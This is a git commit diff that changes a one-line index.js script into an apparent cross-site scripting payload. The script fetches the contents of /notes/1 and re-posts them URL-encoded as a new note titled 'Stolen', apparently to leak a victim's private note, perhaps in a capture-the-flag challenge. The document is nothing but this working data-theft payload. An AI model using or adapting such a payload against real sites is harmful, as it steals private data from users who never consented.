494bdb2b36f0c1561cec285cedd788d5aad30b71
Lu William Hanugra <lu.hanugra@binus.ac.id>
2025-03-27 00:45:30 +0700

    Update index.js

--- index.js
+++ index.js
@@ -1,1 +1,1 @@
-fetch('/notes/1').then(r=>r.text()).then(d=>fetch('/notes',{method:'POST',body:'title=X&content=aaa'}))
+fetch('/notes/1').then(r=>r.text()).then(d=>fetch('/notes',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'title=Stolen&content='+encodeURIComponent(d)}))
